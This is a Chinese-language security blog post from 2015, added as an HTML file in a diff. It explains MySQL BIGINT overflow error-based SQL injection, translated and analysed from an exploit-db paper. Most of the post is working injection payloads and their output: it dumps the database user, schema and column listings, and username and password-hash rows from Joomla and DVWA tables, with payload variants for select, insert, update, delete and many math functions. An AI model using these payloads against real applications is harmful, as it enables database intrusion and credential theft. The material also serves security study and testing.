@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <link rel="shortcut icon" href="../../../public/1616.ico">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <title>BIGINT Overflow Error Based SQL Injection - Posted By Tr3jer</title>
+    <meta name="description" content="Hacking for fun. - Tr3jer_CongRong"/>
+    <link rel="stylesheet" href="/css/Tr3jer.css" type="text/css" />
+    <link rel="stylesheet" href="/css/syntax.css" type="text/css" />
+  </head>
+  <body>
+    <div class="site">
+      <div class="post-content">
+        <div id="post">
+          <h1 id="bigint-overflow-error-based-sql-injection">BIGINT Overflow Error Based SQL Injection</h1>
+<p class="date">10 Aug 2015 - Tr3jer_CongRong</p>
+
+<blockquote>
+  <p>根据Mysql BIGINT数据类型，结合Mysql两个小特性，巧妙的构造出新型报错注入。Paper翻译自<a target="_blank" href="https://www.exploit-db.com/docs/37733.pdf">BIGINT Overflow Error Based SQL Injection</a>，这里就分析下此报错注入的方式与原理。</p>
+</blockquote>
+
+<p>      <strong>首先看看Mysql(&gt;=5.5.5)如何存储整数的，之前的版本当整数溢出的时候不会报错。<a target="_blank" href="http://dev.mysql.com/doc/refman/5.5/en/integer-types.html">Integer Types (Exact Value)</a></strong></p>
+
+<p><img src="http://7xiw31.com1.z0.glb.clouddn.com/i76ryjtgdh.png" /></p>
+
+<p>      <strong>BIGINT数据类型的长度为8字节(64Bytes)，分别用二进制、十进制、十六进制的<code>signed/unsigned</code>表示最大值:</strong></p>
+
+<pre><code>#signed - Binary、Decimal、Hex
+0b0111111111111111111111111111111111111111111111111111111111111111
+9223372036854775807
+0x7fffffffffffffff
+
+#unsigned - Binary、Decimal、Hex
+0b1111111111111111111111111111111111111111111111111111111111111111
+18446744073709551615
+0xFFFFFFFFFFFFFFFF
+</code></pre>
+
+<p>      <strong>分别将<code>signed/unsigned</code>的BIGINT最大值进行数学计算，来证明报错的原因：</strong></p>
+
+<pre><code>#signed
+mysql&gt; select cast(x'7fffffffffffffff' as signed)/9223372036854775807;
++---------------------------------------------------------+
+| cast(x'7fffffffffffffff' as signed)/9223372036854775807 |
++---------------------------------------------------------+
+|                                                  1.0000 |
++---------------------------------------------------------+
+1 row in set (0.00 sec)
+mysql&gt; select cast(x'7fffffffffffffff' as signed)+1;
+ERROR 1690 (22003): BIGINT value is out of range in '(cast(0x7fffffffffffffff as signed) + 1)'
+
+#unsigned
+mysql&gt; select 18446744073709551615-1;
++------------------------+
+| 18446744073709551615-1 |
++------------------------+
+|   18446744073709551614 |
++------------------------+
+1 row in set (0.00 sec)
+mysql&gt; select 18446744073709551615+1;
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(18446744073709551615 + 1)'
+</code></pre>
+
+<p>      <strong>由此看出当BIGINT最大值进行增值运算的时候，<code>signed/unsigned</code>都会爆出<code>BIGINT value is out of range</code>的错误，也就是溢出了。还有就是Mysql逐位取反的特性，打个比方：</strong></p>
+
+<pre><code>mysql&gt; select ~0;
++----------------------+
+| ~0                   |
++----------------------+
+| 18446744073709551615 |
++----------------------+
+1 row in set (0.00 sec)
+mysql&gt; select ~18446744073709551615;
++-----------------------+
+| ~18446744073709551615 |
++-----------------------+
+|                     0 |
++-----------------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select 1-~0;
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(1 - ~(0))'
+
+mysql&gt; select 1+~0;
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(1 + ~(0))'
+</code></pre>
+
+<p>      <strong>也就是说从0逐位取反，得到的数字也正是BIGINT中unsigned的数值范围，这个数值进行数学运算时同样会出现溢出错误。那么怎样能在实际应用当中利用上这个报错呢？接下来就说到了Mysql子查询的一个特性，当查询结果成功返回时，返回值为0，表达式进行逻辑非运算后，返回值则为1，并且这个返回值也可以进行数学运算：</strong></p>
+
+<pre><code>mysql&gt; select !(select*from(select user())x)+1;
++----------------------------------+
+| !(select*from(select user())x)+1 |
++----------------------------------+
+|                                2 |
++----------------------------------+
+1 row in set (0.00 sec)
+</code></pre>
+
+<p>      <strong>根据子查询的特点，再结合BIGINT逐位取反的溢出报错。我们就可以进行报错注入了：</strong></p>
+
+<pre><code>mysql&gt; select !(select*from(select user())x)-~18446744073709551615;
++------------------------------------------------------+
+| !(select*from(select user())x)-~18446744073709551615 |
++------------------------------------------------------+
+|                                                    1 |
++------------------------------------------------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select !(select*from(select user())x)-~0;
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select 'root@localhost' from dual))) - ~(0))'
+
+mysql&gt; select (select(!x-~0)from(select(select user())x)a);
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not('root@localhost')) - ~(0))'
+
+mysql&gt; select (select!x-~0.from(select(select user())x)a);
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not('root@localhost')) - ~(0))'
+</code></pre>
+
+<p>      <strong>既然可以通过BIGINT溢出配合子查询进行报错注入，那么就可以在实战当中获取到更多的数据：</strong></p>
+
+<pre><code>mysql&gt; select !(select*from(select concat_ws(':',id, username, password) from k8fzi_users limit 0,1)x)-~0;
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select '533:admin:$2y$10$wE6S6EEj5Xc3/Jo8rQDSAu0mxQr2FmZJmT4SlsXL8PdM8Ymb/82Ly' from dual))) - ~(0))'
+</code></pre>
+
+<p>      <strong>因为是BIGINT数值范围溢出特点，那么Mysql中很多数学函数也可以应用到，Mysql的语法灵活，这些数学函数是可以嵌套表达式的，然后将返回值进行运算。</strong></p>
+
+<pre><code>select !hex((select*from(select user())x))-~0;
+select !ceil((select*from(select user())x))-~0;
+select !atan((select*from(select user())x))-~0;
+select !rand((select*from(select user())a))-~0;
+select !sqrt((select*from(select user())a))-~0;
+select !round((select*from(select user())a))-~0;
+select !sign((select*from(select user())a))-~0;
+select !floor((select*from(select user())a))-~0;
+select !tan((select*from(select user())a))-~0;
+select !ceiling((select*from(select user())a))-~0;
+select !exp((select*from(select user())x))-~0;
+select !(select*from(select user())a)-~1^200;
+</code></pre>
+
+<p>      <strong>既然是报错类型的注入，那么一次性存储也是可以的：</strong></p>
+
+<pre><code>mysql&gt; select !(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x2d2d,table_name,0x2d2d,column_name)),@)))x)-~0;
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select '000
+joomla_3.4.4--k8fzi_assets--id
+joomla_3.4.4--k8fzi_assets--parent_id
+joomla_3.4.4--k8fzi_assets--lft
+joomla_3.4.4--k8fzi_assets--rgt
+joomla_3.4.4--k8fzi_assets--level
+joomla_3.4.4--k8fzi_assets--name
+joomla_3.4.4--k8fzi_assets--title
+joomla_3.4.4--k8fzi_assets--rules
+joomla_3.4.4--k8fzi_associations--id
+joomla_3.4.4--k8fzi_associations--context
+joomla_3.4.4--k8fzi_associations--key
+joomla_3.4.4--k8fzi_banner_clients--id
+joomla_3.4.4--k8fzi_banner
+</code></pre>
+
+<p>      <strong>这里纠正一个Paper中错误的观点，文中提到一次性存储表列数据只能取出27行，其实这是报错信息的最大长度所决定的，如果只想取到重要信息的话，Payload中不加库名表名还有分隔符简短点就可以了，一图胜千言。</strong></p>
+
+<p><img src="http://7xiw31.com1.z0.glb.clouddn.com/5u6ehrtsdf.png" /></p>
+
+<p>      <strong>当知道库名表名列名后，就可以构造语句获取数据了：</strong></p>
+
+<pre><code>#select:
+mysql&gt; select !(select*from(select(concat(@:=0,(select count(*)from`dvwa`.users where @:=concat(@,0xa,user_id,0x2d2d,user,0x2d2d,password)),@)))x)-~0;
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select '000
+1--admin--5f4dcc3b5aa765d61d8327deb882cf99
+2--gordonb--e99a18c428cb38d5f260853678922e03
+3--1337--8d3533d75ae2c3966d7e0d4fcc69216b
+4--pablo--0d107d09f5bbe40cade3de5c71e9e9b7
+5--smithy--5f4dcc3b5aa765d61d8327deb882cf99' from dual))) - ~(0))'
+
+#insert:
+mysql&gt; insert into users (user_id,user,password) values (2,'' or !(select*from(select(concat(@:=0,(select count(*)from`dvwa`.users where @:=concat(@,0xa,user_id,0x2d2d,user,0x2d2d,password)),@)))x)-~0 or '', 'Eyre');
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select '000
+1--admin--5f4dcc3b5aa765d61d8327deb882cf99
+2--gordonb--e99a18c428cb38d5f260853678922e03
+3--1337--8d3533d75ae2c3966d7e0d4fcc69216b
+4--pablo--0d107d09f5bbe40cade3de5c71e9e9b7
+5--smithy--5f4dcc3b5aa765d61d8327deb882cf99' from dual))) - ~(0))'
+
+#update:
+mysql&gt; update users set password='root' or !(select*from(select(concat(@:=0,(select count(*)from`dvwa`.users where @:=concat(@,0xa,user_id,0x2d2d,user,0x2d2d,password)),@)))x)-~0;
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select '000
+1--admin--5f4dcc3b5aa765d61d8327deb882cf99
+2--gordonb--e99a18c428cb38d5f260853678922e03
+3--1337--8d3533d75ae2c3966d7e0d4fcc69216b
+4--pablo--0d107d09f5bbe40cade3de5c71e9e9b7
+5--smithy--5f4dcc3b5aa765d61d8327deb882cf99' from dual))) - ~(0))'
+
+#delete:
+mysql&gt; delete from users where user_id='1' or !(select*from(select(concat(@:=0,(select count(*)from`dvwa`.users where @:=concat(@,0xa,user_id,0x2d2d,user,0x2d2d,password)),@)))x)-~0;
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select '000
+1--admin--5f4dcc3b5aa765d61d8327deb882cf99
+2--gordonb--e99a18c428cb38d5f260853678922e03
+3--1337--8d3533d75ae2c3966d7e0d4fcc69216b
+4--pablo--0d107d09f5bbe40cade3de5c71e9e9b7
+5--smithy--5f4dcc3b5aa765d61d8327deb882cf99' from dual))) - ~(0))'
+</code></pre>
+
+        </div>
+      </div>
+      
+      <div id="disqus_thread"></div>
+      <script type="text/javascript">
+      /* * * CONFIGURATION VARIABLES * * */
+      var disqus_shortname = 'tr3jer';
+      
+      /* * * DON'T EDIT BELOW THIS LINE * * */
+      (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+      </script>
+      <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+      <div id="disqus_thread"></div>
+
+      <!-- footer -->
+      <div class="footer">
+        <div class="contact">
+          <p>
+            <a href="/" style="text-decoration: none; margin-right: 5px;">Index</a> |&nbsp;
+            <a href="/feed.xml" target="_blank" style="text-decoration: none; margin-right: 5px;">RSS</a> |&nbsp;
+            <a href="http://weibo.com/Tr3jer" target="_blank" style="text-decoration: none; margin-right: 5px;">Weibo</a> |&nbsp;
+            <a href="https://twitter.com/Tr3jer" target="_blank" style="text-decoration: none; margin-right: 5px;">Twitter</a> |&nbsp;
+            <a href="/link" target="_blank" style="text-decoration: none; margin-right: 5px;">Links</a> |&nbsp;
+            <a href="/mail.txt" target="_blank">Gmail</a>
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <div style="display: none;">
+      <script src="http://s11.cnzz.com/z_stat.php?id=1256907244&web_id=1256907244" language="JavaScript"></script>
+    </div>
+  </body>
+</html>
